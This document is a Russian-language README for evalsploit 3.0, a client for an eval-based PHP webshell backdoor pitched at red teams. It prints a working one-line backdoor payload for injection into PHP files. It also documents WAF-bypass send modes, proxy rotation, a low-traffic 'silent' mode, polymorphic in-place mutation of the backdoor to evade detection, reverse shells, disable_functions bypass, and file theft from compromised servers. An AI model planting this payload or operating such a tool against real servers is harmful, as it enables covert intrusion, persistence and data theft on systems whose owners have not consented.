# evalsploit 3.0

**Клиент для eval-based PHP-бэкдора** для red team и тестирования на проникновение. Работает в ограниченных средах, где отключены `exec()` и шелл: все файловые операции выполняются только встроенными средствами PHP (fopen, DirectoryIterator, copy, unlink и т.д.).

- **Однострочный пейлоад** - можно внедрить в любое исполняемое место заражённого PHP-файла или использовать как отдельный шелл.
- **Файлы сессий** - сохранение и загрузка подключений (URL + ключи Z, V) для быстрого переподключения.
- **Мутация** - замена строки бэкдора в файле на новый полиморфный пейлоад и переключение клиента на новые ключи.
- **Режим silent** - при подключении не запрашивать идентификацию (pwd, ping), минимум трафика до первых команд.
- **Прокси** - список ``host:port, проверка валидности, один прокси на сессию (random или по номеру), смена без выхода в меню.
- **Плагины** - добавление своих команд без правки ядра (см. раздел "Плагины").

## Установка

```bash
cd evalsploit
pip install -e .
# или
pip install -r requirements.txt
```

Данные (сессии, настройки, user-agent) хранятся в каталоге `data/`. При необходимости скопируйте `evalsploit-main/useragents` в `data/useragents`.

## Запуск

```bash
python -m evalsploit
# или
evalsploit
```

При старте можно: ввести **имя сессии** (из `data/sessions/`), ввести **новый URL** или оставить пусто для использования последнего подключения из `data/settings.ini`.

## Пейлоад

Пейлоад используется как одна строка в любом исполняемом PHP-коде или как отдельный файл:

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

После смены режима отправки (`set send`) или своих имён параметров выполните **gen**, чтобы получить соответствующий пейлоад (и укажите те же Z, V в сессии или настройках).

---

## Режимы отправки (send)

| Режим     | Описание |
|----------|----------|
| **bypass** | Пейлоад в base64, разбит блоками с разделителем; параметры Z и V. Обход части WAF/фильтров. |
| **classic** | Пейлоад в base64 в параметре Z. |
| **simple**  | Сырой PHP в параметре Z (без разбора по маркеру, для отладки). |

При подключении (если не включён **silent**) клиент по очереди пробует режимы и сохраняет рабочий. Задать вручную: `set send bypass|classic|simple`.

|-----------|----------|

| **cd**, **pwd**, **home** | Смена каталога, вывод текущего пути, переход в __DIR__ |
| **cat**   | Вывод файла (стиль: `set cat bcat` / `set cat cat`) |
| **cp**    | Копирование: `cp <откуда> : <куда>` (разделитель ` : `; оба пути могут содержать пробелы) |
| **rm**, **del** | Удалить файл: `rm <path>` или `del <path>` (подтверждение при set confirm 1) |
| **ren**, **mv** | Переименовать/переместить: `ren <старое> : <новое>` |
| **download**, **get**, **dl** | Скачать с сервера: `download <удалённый_путь>` или `download <удалённый_путь> : <локальный_путь>` (без второго аргумента - в data/downloads; с ` : ` - в указанный файл или каталог; пробелы в путях допустимы) |
| **upload**, **put**, **upl** | Загрузить: `upload <локальный_путь>` или `upload <локальный_путь> : <удалённый_путь>` (двоеточие для необязательного удалённого пути; оба пути могут содержать пробелы) |
| **mkdir**, **mkd**, **md** | Создать каталог |
| **create**, **mkf** | Создать пустой файл |

| **edit**  | Скачать -> редактировать локально -> загрузить |
| **run**   | Режим шелла (exec/shell_exec/...) - выход: `exit` |
| **exploit** | Обход disable_functions (например 7.3–8.1) |
| **scan**  | Рекурсивное сканирование, отчёт в report/ |
| **reverse** | Reverse shell: `reverse <хост>:<порт>` |
| **set**   | Настройки: `set <модуль> <значение>` или `set <модуль> help` (в т.ч. set proxy 0/1) |
| **proxy_switch** | Сменить текущий прокси: без аргументов (новый random), N (№ прокси), random |
| **gen**, **generate** | Сгенерировать пейлоад для текущего send и Z, V |
| **mutate** | Заменить строку бэкдора на сервере на новый полиморфный пейлоад, обновить Z, V |
| **sessions**, **saved** | Список сохранённых сессий |
| **save** \<name\> | Сохранить текущее подключение как сессию |
| **connect** \<name\> | Переключиться на сохранённую сессию |
| **config** | Показать текущие настройки |
| **info**   | Информация о сервере (PHP, OS и т.д.) |
| **ping**, **check** | Проверка связи и задержки |
| **php**    | PHP-консоль: ввод своего кода, отправка на сервер |
| **try**, **detect** | Проверка доступных вариантов выполнения (например `try run`) |
| **menu**   | Вернуться в главное меню (текущая сессия завершается; запрос подтверждения) |
| **help**, **exit** | Справка; выход (перед завершением программы запрашивается подтверждение) |

## Файлы сессий

Хранятся в `data/sessions/` как `<имя>.ini`:

```ini
[SESSION]
url = https://target.com/shell.php
Z = mg1qjg
V = 3I15EA
send_mode = bypass
silent = 0
```

Обязательны URL и ключи (Z, V). **save \<имя\>** в основном цикле создаёт сессию; при подключении при старте можно сохранить текущее подключение; **connect \<имя\>** загружает сессию. Поле **silent** сохраняется в сессии (при загрузке сессии подставляется значение оттуда).

---

## Режим silent

При **set silent 1** при подключении не выполняются:
- запрос текущей директории (pwd);
- проверка доступности бэкдора (ping) и перебор режимов send.

Команды отправляются как обычно; при необходимости текущий путь можно узнать командой **pwd** или **cwd** (плагин). Режим удобен для минимизации трафика до первых осознанных действий. Сохраняется глобально и в файле сессии.

---

## Прокси

В **стартовом меню** пункт **5. Прокси** - подменю: загрузка списка из файла (`data/proxies.txt` или свой путь), проверка каждого прокси на валидность (GET через прокси), список с отметкой OK, включить/выключить, выбрать режим - **random** (по умолчанию; один случайный прокси на сессию) или по номеру из списка. Список хранится в `data/proxies.txt` (одна строка = `host:port`, пустые и строки с `#` игнорируются). Проверенные индексы хранятся только в памяти до перезапуска.

**После подключения:** **set proxy 0** - выключить, **set proxy 1** - включить. **set proxy show** - показать проверенные прокси и выбрать номер. **set proxy switch** - выбрать другой случайный прокси (кроме текущего). **set proxy switch N** - переключиться на прокси №N. **set proxy switch random** - режим random, следующий запрос через новый случайный. Можно также использовать **proxy_switch** (алиас). Один выбранный прокси используется до смены или выключения.

## Настройки (set)

- **set run** - функция для команды run (exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do).
- **set ls** / **set cat** - стиль вывода списка и чтения файла (варианты из snippets.ini).
- **set send** - режим отправки: bypass, classic, simple.
- **set silent** - 0 или 1 (см. выше).
- **set reverse** - тип reverse shell: ivan, monkey.
- **set confirm** - запрос подтверждения для опасных операций (rm, upl, edit и т.д.): 0 или 1.
- **set rm**, **set del**, **set download**, **set upload**, **set rename**, **set stat**, **set touch**, **set create**, **set mkdir**, **set cp** - выбор сниппета для соответствующей команды (ключи из snippets.ini). Принимаются и алиасы (dl, get, upl, put, mkf, mkd, md, ren, mv).

## Плагины

Плагины позволяют добавлять новые команды без изменения ядра evalsploit.

### Как это устроено

При старте evalsploit загружает все файлы `*.py` из каталога `evalsploit/plugins/` (файлы, начинающиеся с `_`, пропускаются). Каждый плагин должен зарегистрировать команду через декоратор `@register` и реализовать класс, наследующий `Module` с методом `run(ctx, args)`.

- **ctx** (SessionContext) - текущая сессия: `ctx.send(php)` для отправки PHP на сервер, `ctx.config`, `ctx.pwd`, `ctx.resolve_path(path)`, `ctx.file_exists(path)`, `ctx.url`, `ctx.uagent` и т.д.
- **args** - строка: всё, что пользователь ввёл после имени команды (разбор аргументов - в плагине).

Опционально в `@register` указываются **description** и **usage** - они попадают в вывод **help**.

### Минимальный пример плагина

Создайте файл `evalsploit/plugins/mycmd.py`:

```python
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

@register("mycmd", description="Краткое описание", usage="mycmd [path]")
class MyCmdModule(Module):
    def run(self, ctx, args):
        path = ctx.resolve_path(args.strip()) if args.strip() else ctx.pwd
        php = "echo getcwd();"
        print(ctx.send(php).strip())
        return None
```

После следующего запуска команда **mycmd** появится в списке команд и в **help**.

### Рекомендации

- Один файл - одна команда (имя команды задаётся в `@register`, не обязательно совпадает с именем файла).
- Импорты: `register` из `evalsploit.modules.registry`, `Module` из `evalsploit.modules.base`. Для подстановки в PHP-строки используйте `php_quote()` из `evalsploit.modules.base`.
- Обрабатывайте исключения и выводите сообщения пользователю; не допускайте необработанных падений.
- Для опасных операций можно использовать `confirm_dangerous(ctx, action, detail)` из `evalsploit.modules.base`.

Подробнее см. [evalsploit/plugins/README.md](evalsploit/plugins/README.md) и примеры в `evalsploit/plugins/example_echo.py`, `example_cwd.py`.

## Сниппеты

Файловые команды (ls, cat, rm, dl, upload, touch, stat и т.д.) используют PHP-сниппеты из `evalsploit/modules/snippets/`. Индекс - в `snippets.ini`: секция по типу команды, ключ - имя варианта. Выбор варианта: **set** \<команда\> \<ключ\>. При загрузке настроек ключи из settings.ini проверяются; неверные сбрасываются с предупреждением в stderr.

---

## Мутация

**mutate** генерирует новый полиморфный бэкдор (новые Z, V), отправляет PHP, который читает текущий скрипт, находит строку с текущим триггером (`isset($_POST['Z'])`), заменяет её на новый бэкдор и записывает файл. Клиент обновляет свои Z и V. Другие копии бэкдора (другие URL) продолжают использовать старые ключи до ручного обновления или мутации там.

---

## Архитектура

- **config** - глобальные настройки, загрузка/сохранение сессий, валидация ключей сниппетов.
- **context** - URL, pwd, user-agent, `send(php)` и помощники путей (`resolve_path`, `file_exists`).
- **transport** - кодирование пейлоада (bypass/classic/simple), POST, разбор ответа по маркеру (весь вывод до маркера игнорируется).
- **payloads** - генерация однострочника, полиморфного бэкдора и PHP для мутации.
- **modules** - каждая команда зарегистрированный модуль; файловые операции используют сниппеты из `evalsploit/modules/snippets/`.

Добавление нового модуля в ядро: класс с `run(ctx, args)`, декоратор `@register("cmdname")`, при необходимости сниппет в `snippets/`. При подстановке путей и данных в сниппеты используйте `php_quote(value)` из `evalsploit.modules.base`.

## Changelog (относительно более ранних версий evalsploit)

### Добавлено и улучшено

- **menu** - Возврат в главное меню из цикла сессии; запрос подтверждения, текущая сессия явно завершается. **exit** теперь тоже запрашивает подтверждение перед выходом из процесса.
- **Имена команд и алиасы** - Более привычные основные имена с обратно совместимыми вариантами:
  - **mkdir** (алиасы: mkd, md) - создать каталог  
  - **create** (алиас: mkf) - создать пустой файл  
  - **download** (алиасы: get, dl) - скачать с сервера; опционально `download <удалённый> : <локальный>` - сохранение в указанный файл или каталог (без второго аргумента - в data/downloads).  
  - **upload** (алиасы: put, upl) - загрузить; необязательный удалённый путь через разделитель ` : `  
  - **ren** (алиас: mv) - переименовать/переместить  
  - **gen** (алиас: generate), **try** (алиас: detect), **rm** (алиас: del)
- **Пути с пробелами** - Команды с двумя путями используют разделитель ` : ` (cp, ren/mv, upload). Команды с одним путём (download, get, dl, rm, cat, cd и т.д.) принимают всю строку как один путь - пробелы поддерживаются. **upload** переведён на ` : ` для необязательного удалённого пути, чтобы оба пути могли содержать пробелы.
- **Справка (usage)** - В HELP_TEXTS и в help в приложении указаны корректные форматы: например `cp <from> : <to>`, `download <remote_path>`, `upload <local_path> [ : <remote_path>]`.
- **set** - Принимает все новые имена и алиасы для выбора сниппетов (mkdir, create, download, upload, del, ren, mv и т.д.).

### Критические / поведенческие изменения

- **upload** - Два пути должны разделяться символом ` : `. Старый формат `upload <локальный> <удалённый>` (два слова через пробел) больше не поддерживается; используйте `upload <локальный> : <удалённый>` для путей с пробелами.
- **exit** - Требуется подтверждение (y/yes) перед выходом из программы; EOF (например Ctrl+Z/D) по-прежнему завершает без запроса.

## Сравнение с аналогами

### Weevely

- **Weevely** использует свой формат пейлоада и протокол (referrer/cookie, шифрование, сжатие), много модулей «из коробки». Код бэкдора и протокол сложнее, сильнее привязаны к инструменту.
- **evalsploit**: один простой eval-based однострочник, минимальный след на сервере. Гибкая смена ключей (Z, V) и режимов отправки (bypass/classic/simple) без смены всей инфраструктуры. Мутация прямо в файле - замена одной строки. Все файловые операции - только встроенным PHP (fopen, DirectoryIterator и т.д.), без exec/shell, что полезно при жёстком disable_functions. Плагины на Python - добавление своих команд без пересборки.

### PhpSploit

- **PhpSploit** - полноценный C2-фреймворк с полиморфным однострочником, туннелированием в заголовках HTTP, множеством плагинов, прокси (HTTP/HTTPS/SOCKS).
- **evalsploit**: фокус на простоте и минимализме. Один eval-однострочник, параметры POST (Z, V), маркер в ответе - предсказуемая отладка и лёгкая интеграция со своими скриптами. Сессии в виде обычных .ini (url, Z, V, send_mode, silent). Режим **silent** для минимизации трафика при подключении. Сниппеты подключаются через конфиг (set rm/dl/upload/…), валидация ключей при загрузке. Расширяемость через плагины в одной папке без правки ядра.

### Кратко: преимущества evalsploit

- Минимальный пейлоад - одна строка eval, легко внедрить в любой исполняемый PHP.
- Работа без exec/shell - только встроенные функции PHP (под ограничения disable_functions).
- Гибкие ключи и режимы отправки (bypass/classic/simple), мутация на месте (замена строки в файле).
- Сессии и silent - быстрые переподключения, минимум запросов при необходимости.
- Плагины - новые команды через один .py в plugins/, без изменения ядра.
- Простая архитектура - конфиг, контекст, транспорт, модули, сниппеты; понятная отладка и доработка.
